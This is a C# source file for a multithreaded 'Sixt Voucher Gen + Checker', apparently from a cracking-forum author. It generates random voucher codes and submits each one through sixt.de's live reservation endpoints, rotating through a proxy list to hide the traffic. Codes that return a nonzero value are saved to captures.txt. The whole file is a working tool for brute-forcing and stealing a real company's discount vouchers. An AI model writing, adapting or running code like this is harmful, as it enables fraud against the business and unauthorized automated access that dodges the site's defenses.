using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Web;

using Console = Colorful.Console;

namespace SixtVoucherChecker
{
    class Program
    {
        static string Generate()
        {
            string letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            string numbers = "01234567890";

            Random random = new Random((int)(DateTime.Now.Ticks & 0xFFFFFFFF));

            string voucher = "NLUG";

            //for (int i = 0; i < 4; i++)
            //    voucher += letters[random.Next(0, letters.Length - 1)];

            for (int i = 0; i < 10; i++)
                voucher += numbers[random.Next(0, numbers.Length - 1)];

            return voucher;
        }
        static string Check(string voucher, WebProxy proxy = null)
        {
            CookieContainer cookies = new CookieContainer();
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://www.sixt.de");
            request.CookieContainer = cookies;
            request.Proxy = proxy;


            using(var response = request.GetResponse())
            {

            }

            HttpWebRequest request2 = (HttpWebRequest)WebRequest.Create($"https://www.sixt.de/php/reservation/offer.request?_=1583329299597&tab_identifier=1583329289&wants_uk_del=0&wants_uk_col=0&wants_coi=0&wants_geo_delivery=0&wants_geo_collection=0&geo_del_name=&geo_del_street=&geo_del_postcode=&geo_del_town=&geo_del_country=DE&geo_del_remark=&geo_col_name=&geo_col_street=&geo_col_postcode=&geo_col_town=&geo_col_country=DE&geo_col_remark=&uci=40089&rci=40089&uli=DE&rli=DE&uda=06.03.2020&rda=09.03.2020&uti=12%3A00&rti=09%3A00&posl=DE");
            request2.CookieContainer = cookies;
            request2.Proxy = proxy;


            using (var response = request2.GetResponse())
            {

            }

            HttpWebRequest request3 = (HttpWebRequest)WebRequest.Create($"https://www.sixt.de/php/reservation/offerselect");
            request3.Method = "POST";
            request3.ContentType = "application/x-www-form-urlencoded";
            request3.CookieContainer = cookies;
            request3.Proxy = proxy;

            using (var requestStream = request3.GetRequestStream())
            using(var streamWriter = new StreamWriter(requestStream))
            {
                streamWriter.Write($"tab_identifier=1583329289&uci=40089&rci=40089&uli=DE&rli=DE&layout=list&posl=DE&is_corpcust=&has_social_login=&pu_eq_ret=1&uda=06.03.2020&uti=12%3A00&geo_del_name=&geo_del_street=&geo_del_postcode=&geo_del_town=&geo_del_country=DE&del_note=&rda=09.03.2020&rti=09%3A00&geo_col_name=&geo_col_street=&geo_col_postcode=&geo_col_town=&geo_col_country=DE&col_note=");
            }

            using(var response = request3.GetResponse())
            {

            }

            HttpWebRequest request4 = (HttpWebRequest)WebRequest.Create($"https://www.sixt.de/php/reservation/offerconfig");
            request4.CookieContainer = cookies;
            request4.Method = "POST";
            request4.ContentType = "application/x-www-form-urlencoded";
            request4.Proxy = proxy;


            using (var requestStream = request4.GetRequestStream())
            using (var streamWriter = new StreamWriter(requestStream))
            {
                streamWriter.Write($"tab_identifier=1583329289&layout=&offer_handle=FWMR-DEW5R000-3&offer_type=standard");
            }

            using (var response = request4.GetResponse())
            {

            }



            HttpWebRequest request5 = (HttpWebRequest)WebRequest.Create($"https://www.sixt.de/php/reservation/customerdetails");
            request5.Method = "POST";
            request5.ContentType = "application/x-www-form-urlencoded";
            request5.CookieContainer = cookies;
            request5.Proxy = proxy;




            using (var requestStream = request5.GetRequestStream())
            using(var streamWriter = new StreamWriter(requestStream))
            {
                streamWriter.Write($"tab_identifier=1583329289&layout=&offer_handle=FWMR-DEW5R000-3&offer_type=standard");
            }

            using(var response = request5.GetResponse())
            {

            }

            HttpWebRequest checkRequest = (HttpWebRequest)WebRequest.Create($"https://www.sixt.de/php/reservation/chk_vonr?_=1583326826382&tab_identifier=1583329289&voucher%5B0%5D={voucher}&nam1=&nam2=&emai=&tel=&tel_cc=%2B49");
            checkRequest.CookieContainer = cookies;
            checkRequest.Proxy = proxy;

            using (var checkResponse = checkRequest.GetResponse())
            using(var responseReader = new StreamReader(checkResponse.GetResponseStream()))
            {
                string responseText = responseReader.ReadToEnd();

                dynamic jsonData = JsonConvert.DeserializeObject(responseText);

                string val = (string)jsonData.rec.prices.voucher_sum;

                val = val.Replace("&euro; ", "");


                float floatVal = float.Parse(val);

                if(floatVal != 0)
                {
                    return $"{voucher} | {val} EUR";
                }

            }
            return null;
        }
        static void Main(string[] args)
        {
            Console.WriteLine("Sixt Voucher Gen + Checker - By Aesir [ Nulled: SickAesir | Discord: Aesir#1337 | Telegram: @sickaesir ]", Color.Cyan);

            List<KeyValuePair<string, int>> proxies = new List<KeyValuePair<string, int>>();
            if (!File.Exists("proxies.txt"))
            {
                Console.WriteLine($"[Error] Proxy file proxies.txt not found, the checker will run in proxyless mode!", Color.Yellow);
                //Console.ReadLine();
                //return;
            }
            else
            {
                string[] proxyLines = File.ReadAllLines("proxies.txt");

                foreach (var proxy in proxyLines)
                {
                    string[] proxySplit = proxy.Split(":");

                    if (proxySplit.Length < 2) continue;

                    proxies.Add(new KeyValuePair<string, int>(proxySplit[0], int.Parse(proxySplit[1])));
                }

                Console.WriteLine($"[Info] Loaded {proxies.Count} proxies", Color.Green);
            }


            Console.Write($"[Config] How many threads do you want to use? ", Color.Orange);
            int threadCount = int.Parse(Console.ReadLine());

            if (threadCount <= 0) threadCount = 1;


            object locker = new object();
            ulong checkedVouchers = 0;
            List<Thread> threads = new List<Thread>();
            for (int i = 0; i < threadCount; i++)
            {
                Thread thread = new Thread(k =>
                {
                    while (true)
                    {

                        string voucher = Generate();
                        lock (locker)
                            Console.Title = $"Checked Vouchers: {checkedVouchers} | Last Generated Voucher: {voucher}";

                        WebProxy webProxy = null;

                        if(proxies.Count > 0)
                        {
                            var proxy = proxies[new Random().Next(0, proxies.Count - 1)];
                            webProxy = new WebProxy($"http://{proxy.Key}:{proxy.Value}");
                        }


                        string res;
                        try
                        {
                            res = Check(voucher, webProxy);
                        }
                        catch (Exception ex)
                        {
                            continue;
                        }

                        lock (locker)
                        {
                            if (res != null)
                            {
                                Console.WriteLine($"[Capture] {res}", Color.Green);
                                File.AppendAllText("captures.txt", res + "\r\n");
                            }
                            checkedVouchers++;
                        }


                    }
                });

                thread.Start();

                threads.Add(thread);
            }

            foreach (var thread in threads)
                thread.Join();

        }
    }
}
